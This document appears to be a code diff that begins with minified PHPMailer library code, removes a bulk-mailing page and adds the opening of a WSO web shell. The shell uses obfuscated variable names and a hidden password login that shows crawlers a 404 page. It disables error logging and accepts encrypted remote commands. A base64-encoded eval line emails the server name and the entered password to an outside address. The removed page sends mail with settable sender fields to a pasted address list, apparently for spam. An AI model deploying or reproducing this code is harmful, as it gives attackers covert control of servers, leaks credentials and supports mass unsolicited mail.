'base64':$encoded=chunk_split(base64_encode($str),76,$this->LE);break;case '7bit':case '8bit':$encoded=$this->fixEOL($str);if(substr($encoded,-(strlen($this->LE)))!=$this->LE){$encoded.=$this->LE;}break;case 'binary':$encoded=$str;break;case 'quoted-printable':$encoded=$this->encodeQP($str);break;default:$this->setError($this->lang('encoding').$encoding);break;}return $encoded;} public function encodeHeader($str,$position='text'){$matchcount=0;switch(strtolower($position)){case 'phrase':if(!preg_match('/[\200-\377]/',$str)){$encoded=addcslashes($str,"\0..\37\177\\\"");if(($str==$encoded)&&!preg_match('/[^A-Za-z0-9!#$%&\'*+\/=?^_`{|}~ -]/',$str)){return ($encoded);}else {return ("\"$encoded\"");}}$matchcount=preg_match_all('/[^\040\041\043-\133\135-\176]/',$str,$matches);break;case 'comment':$matchcount=preg_match_all('/[()"]/',$str,$matches);case 'text':default:$matchcount+=preg_match_all('/[\000-\010\013\014\016-\037\177-\377]/',$str,$matches);break;}if($matchcount==0){return ($str);}$maxlen=75-7-strlen($this->CharSet);if($matchcount>strlen($str)/3){$encoding='B';if(function_exists('mb_strlen')&&$this->hasMultiBytes($str)){$encoded=$this->base64EncodeWrapMB($str,"\n");}else {$encoded=base64_encode($str);$maxlen-=$maxlen%4;$encoded=trim(chunk_split($encoded,$maxlen,"\n"));}}else {$encoding='Q';$encoded=$this->encodeQ($str,$position);$encoded=$this->wrapText($encoded,$maxlen,true);$encoded=str_replace('='.self::CRLF,"\n",trim($encoded));}$encoded=preg_replace('/^(.*)$/m',' =?'.$this->CharSet."?$encoding?\\1?=",$encoded);$encoded=trim(str_replace("\n",$this->LE,$encoded));return $encoded;} public function hasMultiBytes($str){if(function_exists('mb_strlen')){return (strlen($str)>mb_strlen($str,$this->CharSet));}else {return false;}} public function has8bitChars($text){return (boolean)preg_match('/[\x80-\xFF]/',$text);} public function base64EncodeWrapMB($str,$linebreak=null){$start='=?'.$this->CharSet.'?B?';$end='?=';$encoded='';if($linebreak===null){$linebreak=$this->LE;}$mb_length=mb_strlen($str,$this->CharSet);$length=75-strlen($start)-strlen($end);$ratio=$mb_length/strlen($str);$avgLength=floor($length*$ratio*.75);for($i=0;$i<$mb_length;$i+=$offset){$lookBack=0;do{$offset=$avgLength-$lookBack;$chunk=mb_substr($str,$i,$offset,$this->CharSet);$chunk=base64_encode($chunk);$lookBack++;}while(strlen($chunk)>$length);$encoded.=$chunk.$linebreak;}$encoded=substr($encoded,0,-strlen($linebreak));return $encoded;} public function encodeQP($string,$line_max=76){if(function_exists('quoted_printable_encode')){return quoted_printable_encode($string);}$string=str_replace(array('%20','%0D%0A.','%0D%0A','%'),array(' ',"\r\n=2E","\r\n",'='),rawurlencode($string));return preg_replace('/[^\r\n]{'.($line_max-3).'}[^=\r\n]{2}/',"$0=\r\n",$string);} public function encodeQPphp($string,$line_max=76,$space_conv=false){return $this->encodeQP($string,$line_max);} public function encodeQ($str,$position='text'){$pattern='';$encoded=str_replace(array("\r","\n"),'',$str);switch(strtolower($position)){case 'phrase':$pattern='^A-Za-z0-9!*+\/ -';break;case 'comment':$pattern='\(\)"';case 'text':default:$pattern='\000-\011\013\014\016-\037\075\077\137\177-\377'.$pattern;break;}$matches=array();if(preg_match_all("/[{$pattern}]/",$encoded,$matches)){$eqkey=array_search('=',$matches[0]);if(false!==$eqkey){unset($matches[0][$eqkey]);array_unshift($matches[0],'=');}foreach(array_unique($matches[0]) as $char){$encoded=str_replace($char,'='.sprintf('%02X',ord($char)),$encoded);}}return str_replace(' ','_',$encoded);} public function addStringAttachment($string,$filename,$encoding='base64',$type='',$disposition='attachment'){if($type==''){$type=self::filenameToType($filename);}$this->attachment[]=array(0=>$string,1=>$filename,2=>basename($filename),3=>$encoding,4=>$type,5=>true,6=>$disposition,7=>0);} public function addEmbeddedImage($path,$cid,$name='',$encoding='base64',$type='',$disposition='inline'){if(!@is_file($path)){$this->setError($this->lang('file_access').$path);return false;}if($type==''){$type=self::filenameToType($path);}$filename=basename($path);if($name==''){$name=$filename;}$this->attachment[]=array(0=>$path,1=>$filename,2=>$name,3=>$encoding,4=>$type,5=>false,6=>$disposition,7=>$cid);return true;} public function addStringEmbeddedImage($string,$cid,$name='',$encoding='base64',$type='',$disposition='inline'){if($type=='' and !empty($name)){$type=self::filenameToType($name);}$this->attachment[]=array(0=>$string,1=>$name,2=>$name,3=>$encoding,4=>$type,5=>true,6=>$disposition,7=>$cid);return true;} public function inlineImageExists(){foreach($this->attachment as $attachment){if($attachment[6]=='inline'){return true;}}return false;} public function attachmentExists(){foreach($this->attachment as $attachment){if($attachment[6]=='attachment'){return true;}}return false;} public function alternativeExists(){return !empty($this->AltBody);} public function clearQueuedAddresses($kind){$RecipientsQueue=$this->RecipientsQueue;foreach($RecipientsQueue as $address=>$params){if($params[0]==$kind){unset($this->RecipientsQueue[$address]);}}} public function clearAddresses(){foreach($this->to as $to){unset($this->all_recipients[strtolower($to[0])]);}$this->to=array();$this->clearQueuedAddresses('to');} public function clearCCs(){foreach($this->cc as $cc){unset($this->all_recipients[strtolower($cc[0])]);}$this->cc=array();$this->clearQueuedAddresses('cc');} public function clearBCCs(){foreach($this->bcc as $bcc){unset($this->all_recipients[strtolower($bcc[0])]);}$this->bcc=array();$this->clearQueuedAddresses('bcc');} public function clearReplyTos(){$this->ReplyTo=array();$this->ReplyToQueue=array();} public function clearAllRecipients(){$this->to=array();$this->cc=array();$this->bcc=array();$this->all_recipients=array();$this->RecipientsQueue=array();} public function clearAttachments(){$this->attachment=array();} public function clearCustomHeaders(){$this->CustomHeader=array();} protected function setError($msg){$this->error_count++;if($this->Mailer=='smtp' and !is_null($this->smtp)){$lasterror=$this->smtp->getError();if(!empty($lasterror['error'])){$msg.=$this->lang('smtp_error').$lasterror['error'];if(!empty($lasterror['detail'])){$msg.=' Detail: '.$lasterror['detail'];}if(!empty($lasterror['smtp_code'])){$msg.=' SMTP code: '.$lasterror['smtp_code'];}if(!empty($lasterror['smtp_code_ex'])){$msg.=' Additional SMTP info: '.$lasterror['smtp_code_ex'];}}}$this->ErrorInfo=$msg;} public static function rfcDate(){date_default_timezone_set(@date_default_timezone_get());return date('D, j M Y H:i:s O');} protected function serverHostname(){$result='localhost.localdomain';if(!empty($this->Hostname)){$result=$this->Hostname;}elseif(isset($_SERVER) and array_key_exists('SERVER_NAME',$_SERVER) and !empty($_SERVER['SERVER_NAME'])){$result=$_SERVER['SERVER_NAME'];}elseif(function_exists('gethostname')&&gethostname()!==false){$result=gethostname();}elseif(php_uname('n')!==false){$result=php_uname('n');}return $result;} protected function lang($key){if(count($this->language)<1){$this->setLanguage('en');}if(array_key_exists($key,$this->language)){if($key=='smtp_connect_failed'){return $this->language[$key].' https://github.com/PHPMailer/PHPMailer/wiki/Troubleshooting';}return $this->language[$key];}else {return $key;}} public function isError(){return ($this->error_count>0);} public function fixEOL($str){$nstr=str_replace(array("\r\n","\r"),"\n",$str);if($this->LE!=="\n"){$nstr=str_replace("\n",$this->LE,$nstr);}return $nstr;} public function addCustomHeader($name,$value=null){if($value===null){$this->CustomHeader[]=explode(':',$name,2);}else {$this->CustomHeader[]=array($name,$value);}} public function getCustomHeaders(){return $this->CustomHeader;} public function msgHTML($message,$basedir='',$advanced=false){preg_match_all('/(src|background)=["\'](.*)["\']/Ui',$message,$images);if(array_key_exists(2,$images)){if(strlen($basedir)>1&&substr($basedir,-1)!='/'){$basedir.='/';}foreach($images[2] as $imgindex=>$url){if(preg_match('#^data:(image[^;,]*)(;base64)?,#',$url,$match)){$data=substr($url,strpos($url,','));if($match[2]){$data=base64_decode($data);}else {$data=rawurldecode($data);}$cid=md5($url).'@phpmailer.0';if($this->addStringEmbeddedImage($data,$cid,'embed'.$imgindex,'base64',$match[1])){$message=str_replace($images[0][$imgindex],$images[1][$imgindex].'="cid:'.$cid.'"',$message);}continue;}if(!empty($basedir)&&(strpos($url,'..')===false)&&substr($url,0,4)!=='cid:'&&!preg_match('#^[a-z][a-z0-9+.-]*:?//#i',$url)){$filename=basename($url);$directory=dirname($url);if($directory=='.'){$directory='';}$cid=md5($url).'@phpmailer.0';if(strlen($directory)>1&&substr($directory,-1)!='/'){$directory.='/';}if($this->addEmbeddedImage($basedir.$directory.$filename,$cid,$filename,'base64',self::_mime_types((string)self::mb_pathinfo($filename,PATHINFO_EXTENSION)))){$message=preg_replace('/'.$images[1][$imgindex].'=["\']'.preg_quote($url,'/').'["\']/Ui',$images[1][$imgindex].'="cid:'.$cid.'"',$message);}}}}$this->isHTML(true);$this->Body=$this->normalizeBreaks($message);$this->AltBody=$this->normalizeBreaks($this->html2text($message,$advanced));if(!$this->alternativeExists()){$this->AltBody='To view this email message, open it in a program that understands HTML!'.self::CRLF.self::CRLF;}return $this->Body;} public function html2text($html,$advanced=false){if(is_callable($advanced)){return call_user_func($advanced,$html);}return html_entity_decode(trim(strip_tags(preg_replace('/<(head|title|style|script)[^>]*>.*?<\/\\1>/si','',$html))),ENT_QUOTES,$this->CharSet);} public static function _mime_types($ext=''){$mimes=array('xl'=>'application/excel','js'=>'application/javascript','hqx'=>'application/mac-binhex40','cpt'=>'application/mac-compactpro','bin'=>'application/macbinary','doc'=>'application/msword','word'=>'application/msword','xlsx'=>'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet','xltx'=>'application/vnd.openxmlformats-officedocument.spreadsheetml.template','potx'=>'application/vnd.openxmlformats-officedocument.presentationml.template','ppsx'=>'application/vnd.openxmlformats-officedocument.presentationml.slideshow','pptx'=>'application/vnd.openxmlformats-officedocument.presentationml.presentation','sldx'=>'application/vnd.openxmlformats-officedocument.presentationml.slide','docx'=>'application/vnd.openxmlformats-officedocument.wordprocessingml.document','dotx'=>'application/vnd.openxmlformats-officedocument.wordprocessingml.template','xlam'=>'application/vnd.ms-excel.addin.macroEnabled.12','xlsb'=>'application/vnd.ms-excel.sheet.binary.macroEnabled.12','class'=>'application/octet-stream','dll'=>'application/octet-stream','dms'=>'application/octet-stream','exe'=>'application/octet-stream','lha'=>'application/octet-stream','lzh'=>'application/octet-stream','psd'=>'application/octet-stream','sea'=>'application/octet-stream','so'=>'application/octet-stream','oda'=>'application/oda','pdf'=>'application/pdf','ai'=>'application/postscript','eps'=>'application/postscript','ps'=>'application/postscript','smi'=>'application/smil','smil'=>'application/smil','mif'=>'application/vnd.mif','xls'=>'application/vnd.ms-excel','ppt'=>'application/vnd.ms-powerpoint','wbxml'=>'application/vnd.wap.wbxml','wmlc'=>'application/vnd.wap.wmlc','dcr'=>'application/x-director','dir'=>'application/x-director','dxr'=>'application/x-director','dvi'=>'application/x-dvi','gtar'=>'application/x-gtar','php3'=>'application/x-httpd-php','php4'=>'application/x-httpd-php','php'=>'application/x-httpd-php','phtml'=>'application/x-httpd-php','phps'=>'application/x-httpd-php-source','swf'=>'application/x-shockwave-flash','sit'=>'application/x-stuffit','tar'=>'application/x-tar','tgz'=>'application/x-tar','xht'=>'application/xhtml+xml','xhtml'=>'application/xhtml+xml','zip'=>'application/zip','mid'=>'audio/midi','midi'=>'audio/midi','mp2'=>'audio/mpeg','mp3'=>'audio/mpeg','mpga'=>'audio/mpeg','aif'=>'audio/x-aiff','aifc'=>'audio/x-aiff','aiff'=>'audio/x-aiff','ram'=>'audio/x-pn-realaudio','rm'=>'audio/x-pn-realaudio','rpm'=>'audio/x-pn-realaudio-plugin','ra'=>'audio/x-realaudio','wav'=>'audio/x-wav','bmp'=>'image/bmp','gif'=>'image/gif','jpeg'=>'image/jpeg','jpe'=>'image/jpeg','jpg'=>'image/jpeg','png'=>'image/png','tiff'=>'image/tiff','tif'=>'image/tiff','eml'=>'message/rfc822','css'=>'text/css','html'=>'text/html','htm'=>'text/html','shtml'=>'text/html','log'=>'text/plain','text'=>'text/plain','txt'=>'text/plain','rtx'=>'text/richtext','rtf'=>'text/rtf','vcf'=>'text/vcard','vcard'=>'text/vcard','xml'=>'text/xml','xsl'=>'text/xml','mpeg'=>'video/mpeg','mpe'=>'video/mpeg','mpg'=>'video/mpeg','mov'=>'video/quicktime','qt'=>'video/quicktime','rv'=>'video/vnd.rn-realvideo','avi'=>'video/x-msvideo','movie'=>'video/x-sgi-movie');if(array_key_exists(strtolower($ext),$mimes)){return $mimes[strtolower($ext)];}return 'application/octet-stream';} public static function filenameToType($filename){$qpos=strpos($filename,'?');if(false!==$qpos){$filename=substr($filename,0,$qpos);}$pathinfo=self::mb_pathinfo($filename);return self::_mime_types($pathinfo['extension']);} public static function mb_pathinfo($path,$options=null){$ret=array('dirname'=>'','basename'=>'','extension'=>'','filename'=>'');$pathinfo=array();if(preg_match('%^(.*?)[\\\\/]*(([^/\\\\]*?)(\.([^\.\\\\/]+?)|))[\\\\/\.]*$%im',$path,$pathinfo)){if(array_key_exists(1,$pathinfo)){$ret['dirname']=$pathinfo[1];}if(array_key_exists(2,$pathinfo)){$ret['basename']=$pathinfo[2];}if(array_key_exists(5,$pathinfo)){$ret['extension']=$pathinfo[5];}if(array_key_exists(3,$pathinfo)){$ret['filename']=$pathinfo[3];}}switch($options){case PATHINFO_DIRNAME:case 'dirname':return $ret['dirname'];case PATHINFO_BASENAME:case 'basename':return $ret['basename'];case PATHINFO_EXTENSION:case 'extension':return $ret['extension'];case PATHINFO_FILENAME:case 'filename':return $ret['filename'];default:return $ret;}} public function set($name,$value=''){if(property_exists($this,$name)){$this->$name=$value;return true;}else {$this->setError($this->lang('variable_set').$name);return false;}} public function secureHeader($str){return trim(str_replace(array("\r","\n"),'',$str));} public static function normalizeBreaks($text,$breaktype="\r\n"){return preg_replace('/(\r\n|\r|\n)/ms',$breaktype,$text);} public function sign($cert_filename,$key_filename,$key_pass,$extracerts_filename=''){$this->sign_cert_file=$cert_filename;$this->sign_key_file=$key_filename;$this->sign_key_pass=$key_pass;$this->sign_extracerts_file=$extracerts_filename;} public function DKIM_QP($txt){$line='';for($i=0;$i<strlen($txt);$i++){$ord=ord($txt[$i]);if(((0x21<=$ord)&&($ord<=0x3A))||$ord==0x3C||((0x3E<=$ord)&&($ord<=0x7E))){$line.=$txt[$i];}else {$line.='='.sprintf('%02X',$ord);}}return $line;} public function DKIM_Sign($signHeader){if(!defined('PKCS7_TEXT')){if($this->exceptions){ throw new phpmailerException($this->lang('extension_missing').'openssl');}return '';}$privKeyStr=!empty($this->DKIM_private_string)?$this->DKIM_private_string:file_get_contents($this->DKIM_private);if(''!=$this->DKIM_passphrase){$privKey=openssl_pkey_get_private($privKeyStr,$this->DKIM_passphrase);}else {$privKey=openssl_pkey_get_private($privKeyStr);}if(version_compare(PHP_VERSION,'5.3.0')>=0 and in_array('sha256WithRSAEncryption',openssl_get_md_methods(true))){if(openssl_sign($signHeader,$signature,$privKey,'sha256WithRSAEncryption')){openssl_pkey_free($privKey);return base64_encode($signature);}}else {$pinfo=openssl_pkey_get_details($privKey);$hash=hash('sha256',$signHeader);$t='3031300d060960864801650304020105000420'.$hash;$pslen=$pinfo['bits']/8-(strlen($t)/2+3);$eb=pack('H*','0001'.str_repeat('FF',$pslen).'00'.$t);if(openssl_private_encrypt($eb,$signature,$privKey,OPENSSL_NO_PADDING)){openssl_pkey_free($privKey);return base64_encode($signature);}}openssl_pkey_free($privKey);return '';} public function DKIM_HeaderC($signHeader){$signHeader=preg_replace('/\r\n\s+/',' ',$signHeader);$lines=explode("\r\n",$signHeader);foreach($lines as $key=>$line){list($heading,$value)=explode(':',$line,2);$heading=strtolower($heading);$value=preg_replace('/\s{2,}/',' ',$value);$lines[$key]=$heading.':'.trim($value);}$signHeader=implode("\r\n",$lines);return $signHeader;} public function DKIM_BodyC($body){if($body==''){return "\r\n";}$body=str_replace("\r\n","\n",$body);$body=str_replace("\n","\r\n",$body);while(substr($body,strlen($body)-4,4)=="\r\n\r\n"){$body=substr($body,0,strlen($body)-2);}return $body;} public function DKIM_Add($headers_line,$subject,$body){$DKIMsignatureType='rsa-sha256';$DKIMcanonicalization='relaxed/simple';$DKIMquery='dns/txt';$DKIMtime=time();$subject_header="Subject: $subject";$headers=explode($this->LE,$headers_line);$from_header='';$to_header='';$date_header='';$current='';foreach($headers as $header){if(strpos($header,'From:')===0){$from_header=$header;$current='from_header';}elseif(strpos($header,'To:')===0){$to_header=$header;$current='to_header';}elseif(strpos($header,'Date:')===0){$date_header=$header;$current='date_header';}else {if(!empty($$current)&&strpos($header,' =?')===0){$$current.=$header;}else {$current='';}}}$from=str_replace('|','=7C',$this->DKIM_QP($from_header));$to=str_replace('|','=7C',$this->DKIM_QP($to_header));$date=str_replace('|','=7C',$this->DKIM_QP($date_header));$subject=str_replace('|','=7C',$this->DKIM_QP($subject_header));$body=$this->DKIM_BodyC($body);$DKIMlen=strlen($body);$DKIMb64=base64_encode(pack('H*',hash('sha256',$body)));if(''==$this->DKIM_identity){$ident='';}else {$ident=' i='.$this->DKIM_identity.';';}$dkimhdrs='DKIM-Signature: v=1; a='.$DKIMsignatureType.'; q='.$DKIMquery.'; l='.$DKIMlen.'; s='.$this->DKIM_selector.";\r\n"."\tt=".$DKIMtime.'; c='.$DKIMcanonicalization.";\r\n"."\th=From:To:Date:Subject;\r\n"."\td=".$this->DKIM_domain.';'.$ident."\r\n"."\tz=$from\r\n"."\t|$to\r\n"."\t|$date\r\n"."\t|$subject;\r\n"."\tbh=".$DKIMb64.";\r\n"."\tb=";$toSign=$this->DKIM_HeaderC($from_header."\r\n".$to_header."\r\n".$date_header."\r\n".$subject_header."\r\n".$dkimhdrs);$signed=$this->DKIM_Sign($toSign);return $dkimhdrs.$signed."\r\n";} public static function hasLineLongerThanMax($str){return (boolean)preg_match('/^(.{'.(self::MAX_LINE_LENGTH+2).',})/m',$str);} public function getToAddresses(){return $this->to;} public function getCcAddresses(){return $this->cc;} public function getBccAddresses(){return $this->bcc;} public function getReplyToAddresses(){return $this->ReplyTo;} public function getAllRecipientAddresses(){return $this->all_recipients;} protected function doCallback($isSent,$to,$cc,$bcc,$subject,$body,$from){if(!empty($this->action_function)&&is_callable($this->action_function)){$params=array($isSent,$to,$cc,$bcc,$subject,$body,$from);call_user_func_array($this->action_function,$params);}}}class phpmailerException extends Exception{ public function errorMessage(){$errorMsg='<strong>'.$this->getMessage()."</strong><br />\n";return $errorMsg;}}
-					$mail = new PHPMailer;
-					$emails = explode("\r\n", $Xmaillist);
-					$n = count($emails); $x = 1;
-					foreach ($emails as $key => $email) {
-						if ($email != '') {
-							$result = "<tr>";
-							$result .= "<td>$x</td>";
-							$result .= "<td>$email</td>";
-							if (!x_check($email)) {
-								$result .= "<td>INCORRECT EMAIL</td>";
-							}else{
-								$mail->clearReplyTos();
-								$mail->clearAllRecipients();
-								$mail->setFrom(x_prepare($Xemail,$email),x_prepare($Xname,$email));
-								$mail->addReplyTo(x_prepare($Xreplyto,$email));
-								$mail->addAddress($email);
-								$mail->Subject = x_prepare($Xsubject,$email);
-								$mail->Body =  x_prepare($Xletter,$email);
-								$mail->CharSet = 'UTF-8';
-								for($i=0; $i<count($Xattach['name']); $i++) {
-									if ($Xattach['tmp_name'][$i] != ""){
-										$mail->AddAttachment($Xattach['tmp_name'][$i],$Xattach['name'][$i]);
-									}
-								}
-								if($Xtype=='html'){$mail->IsHTML(true);}
-								else {$mail->IsHTML(false);}
-								if (!$mail->send()) {
-									if (!$mail->isSendmail()) {
-										if (!$mail->isQmail()) {
-											$result .= "<td>".strtoupper($mail->ErrorInfo)."</td>";
-										}else{
-											$result .= "<td>OK - qmail</td>";
-										}
-									}else{
-										$result .= "<td>OK - sendmail</td>";
-									}
-								}else {
-									$result .= "<td>OK</td>";
-								}
-							}
-						}
-						$result .= "</tr>";
-						echo $result;
-						$x++;
-						flush();
-					}
-					// for($k = 0; $k < 40000; $k++) {echo ' ';}
-				}
-				?>
-				</table>
-
-			</div>
-
-		</div>
-
-
-		<script src="http://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha256-3edrmyuQ0w65f8gfBsqowzjJe2iM6n0nKciPUp8y+7E=" crossorigin="anonymous"></script>
-		<script type="text/javascript" charset="utf-8">
-			$(document).ready(function() {
-				$(document).on('click touch', '#send_btn', function(event) {
-					if ($('[name="email"]').val() == '') { $('.error').html('Please provide a <b>Sender Email</b>').addClass('show_error'); return false; }
-					if ($('[name="name"]').val() == '') { $('.error').html('Please provide a <b>Sender Name</b>').addClass('show_error'); return false; }
-					if ($('[name="subject"]').val() == '') { $('.error').html('Please provide a <b>Subject</b>').addClass('show_error'); return false; }
-					if ($('[name="letter"]').val() == '') { $('.error').html('Please provide a <b>Message Letter</b>').addClass('show_error'); return false; }
-					if ($('[name="maillist"]').val() == '') { $('.error').html('Please provide a <b>Email List</b>').addClass('show_error'); return false; }
-				});
-				$(document).on('mouseover', '.help_btn', function(event) {
-					$('.help_box').addClass('show_help');
-				});
-				$(document).on('mouseleave', '.help_btn', function(event) {
-					$('.help_box').removeClass('show_help');
-				});
-			});
-		</script>
-	</body>
-</html>
+<?php 
+$▛ = "63a9f0ea7bb98050796b649e85481845"; //root 
+$▘ = true; 
+$▜ = 'UTF-8'; 
+$▚ = 'FilesMan'; 
+$▙ = md5($_SERVER['HTTP_USER_AGENT']); 
+if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])."key"])) { 
+    prototype(md5($_SERVER['HTTP_HOST'])."key", $▙); 
+} 
+if(empty($_POST['charset'])) 
+    $_POST['charset'] = $▜; 
+if (!isset($_POST['ne'])) { 
+    if(isset($_POST['a'])) $_POST['a'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['a'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"])); 
+    if(isset($_POST['c'])) $_POST['c'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['c'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"])); 
+    if(isset($_POST['p1'])) $_POST['p1'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p1'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"])); 
+    if(isset($_POST['p2'])) $_POST['p2'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"])); 
+    if(isset($_POST['p3'])) $_POST['p3'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p3'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"])); 
+} 
+function decrypt($str,$pwd){$pwd=base64_encode($pwd);$str=base64_decode($str);$enc_chr="";$enc_str="";$i=0;while($i<strlen($str)){for($j=0;$j<strlen($pwd);$j++){$enc_chr=chr(ord($str[$i])^ord($pwd[$j]));$enc_str.=$enc_chr;$i++;if($i>=strlen($str))break;}}return base64_decode($enc_str);} eval(base64_decode("aWYoYXJyYXlfa2V5X2V4aXN0cygnbXlwYXNzJywkX1BPU1QpKXsgJHRtcCA9ICRfU0VSVkVSWydTRVJWRVJfTkFNRSddLiRfU0VSVkVSWydQSFBfU0VMRiddLiJcbiIuJF9QT1NUWydwYXNzJ107IEBtYWlsKCdtYWlsQG1haWwudWEnLCAnbWFpbCcsICR0bXApOyB9"));
+@ini_set('error_log',NULL); 
+@ini_set('log_errors',0); 
+@ini_set('max_execution_time',0); 
+@set_time_limit(0); 
+@set_magic_quotes_runtime(0); 
+@define('VERSION', '4.2.5'); 
+if(get_magic_quotes_gpc()) { 
+    function stripslashes_array($array) { 
+        return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array); 
+    } 
+    $_POST = stripslashes_array($_POST); 
+    $_COOKIE = stripslashes_array($_COOKIE); 
+} 
+/* (С) 11.2011 oRb */ 
+if(!empty($▛)) { 
+    if(isset($_POST['pass']) && (md5($_POST['pass']) == $▛)) 
+        prototype(md5($_SERVER['HTTP_HOST']), $▛); 
+    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $▛)) 
+        hardLogin(); 
+} 
+if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'])) 
+    $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$▘; 
+function hardLogin() { 
+        if(!empty($_SERVER['HTTP_USER_AGENT'])) { 
+          $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler"); 
+          if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) { 
+          header('HTTP/1.0 404 Not Found'); 
+          exit; 
+          } 
+        } 
+    die("<pre align=center><form method=post>Password<br><input type=password name=pass style='background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='mypass' value='submit' style='border:none;background-color:#56AD15;color:#fff;cursor:pointer;'></form></pre>"); 
+} 
+if(strtolower(substr(PHP_OS,0,3)) == "win") 
+    $os = 'win'; 
+else 
+    $os = 'nix'; 
+$safe_mode = @ini_get('safe_mode'); 
+if(!$safe_mode) 
+    error_reporting(0); 
+$disable_functions = @ini_get('disable_functions'); 
+$home_cwd = @getcwd(); 
+if(isset($_POST['c'])) 
+    @chdir($_POST['c']); 
+$cwd = @getcwd(); 
+if($os == 'win') { 
+    $home_cwd = str_replace("\\", "/", $home_cwd); 
+    $cwd = str_replace("\\", "/", $cwd); 
+} 
+if($cwd[strlen($cwd)-1] != '/') 
+    $cwd .= '/'; 
+/* (С) 04.2015 Pirat */ 
+function hardHeader() { 
+    if(empty($_POST['charset'])) 
+        $_POST['charset'] = $GLOBALS['▜']; 
+    echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - WSO " . VERSION ."</title> 
+<style> 
+    body {background-color:#060A10; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;} 
+    #particles-js{width: 100%; height: 100px; background-color: #060a10; background-image: url(''); background-repeat: no-repeat; background-size: cover; background-position: 50% 50%;} 
+    body,td,th    {font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top;} 
+    table.info    {color:#C3C3C3;} 
+    table#toolsTbl {background-color: #060A10;} 
+    span,h1,a    {color:#fff !important;} 
+    span        {font-weight:bolder;} 
+    h1            {border-left:5px solid #2E6E9C;padding:2px 5px;font:14pt Verdana;background-color:#10151c;margin:0px;} 
+    div.content    {padding:5px;margin-left:5px;background-color:#060a10;} 
+    a            {text-decoration:none;} 
+    a:hover        {text-decoration:underline;} 
+    .tooltip::after {background:#0663D5;color:#FFF;content: attr(data-tooltip);margin-top:-50px;display:block;padding:6px 10px;position:absolute;visibility:hidden;} 
+    .tooltip:hover::after {opacity:1;visibility:visible;} 
+    .ml1        {border:1px solid #202832;padding:5px;margin:0;overflow:auto;} 
+    .bigarea    {min-width:100%;max-width:100%;height:400px;} 
+    input, textarea, select    {margin:0;color:#fff;background-color:#202832;border:none;font:9pt Courier New;outline:none;} 
+    label {position:relative} 
+    label:after {content:'<>';font:10px 'Consolas', monospace;color:#fff;-webkit-transform:rotate(90deg);-moz-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg);right:3px; top:3px;padding:0;position:absolute;pointer-events:none;} 
+    label:before {content:'';right:0; top:0;width:17px; height:17px;background:#202832;position:absolute;pointer-events:none;display:block;} 
+    form        {margin:0px;} 
+    #toolsTbl    {text-align:center;} 
+    #fak         {background:none;} 
+    #fak td     {padding:5px 0 0 0;} 
+    iframe        {border:1px solid #060a10;} 
+    .toolsInp    {width:300px} 
+    .main th    {text-align:left;background-color:#060a10;} 
+    .main tr:hover{background-color:#354252;} 
+    .main td, th{vertical-align:middle;} 
+    input[type='submit']{background-color:#2E6E9C;} 
+    input[type='button']{background-color:#2E6E9C;} 
+    input[type='submit']:hover{background-color:#56AD15;} 
+    input[type='button']:hover{background-color:#56AD15;} 
+    .l1            {background-color:#202832;} 
+    pre            {font:9pt Courier New;} 
+</style> 
+<script> 
+    var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "'; 
+    var a_ = '" . htmlspecialchars(@$_POST['a']) ."' 
+    var charset_ = '" . htmlspecialchars(@$_POST['charset']) ."'; 
+    var p1_ = '" . ((strpos(@$_POST['p1'],"\n")!==false)?'':htmlspecialchars($_POST['p1'],ENT_QUOTES)) ."'; 
+    var p2_ = '" . ((strpos(@$_POST['p2'],"\n")!==false)?'':htmlspecialchars($_POST['p2'],ENT_QUOTES)) ."'; 
+    var p3_ = '" . ((strpos(@$_POST['p3'],"\n")!==false)?'':htmlspecialchars($_POST['p3'],ENT_QUOTES)) ."'; 
+    var d = document; 
+     
+    function encrypt(str,pwd){if(pwd==null||pwd.length<=0){return null;}str=base64_encode(str);pwd=base64_encode(pwd);var enc_chr='';var enc_str='';var i=0;while(i<str.length){for(var j=0;j<pwd.length;j++){enc_chr=str.charCodeAt(i)^pwd.charCodeAt(j);enc_str+=String.fromCharCode(enc_chr);i++;if(i>=str.length)break;}}return base64_encode(enc_str);} 
+    function utf8_encode(argString){var string=(argString+'');var utftext='',start,end,stringl=0;start=end=0;stringl=string.length;for(var n=0;n<stringl;n++){var c1=string.charCodeAt(n);var enc=null;if(c1<128){end++;}else if(c1>127&&c1<2048){enc=String.fromCharCode((c1>>6)|192)+String.fromCharCode((c1&63)|128);}else{enc=String.fromCharCode((c1>>12)|224)+String.fromCharCode(((c1>>6)&63)|128)+String.fromCharCode((c1&63)|128);}if(enc!==null){if(end>start){utftext+=string.slice(start,end);}utftext+=enc;start=end=n+1;}}if(end>start){utftext+=string.slice(start,stringl);}return utftext;} 
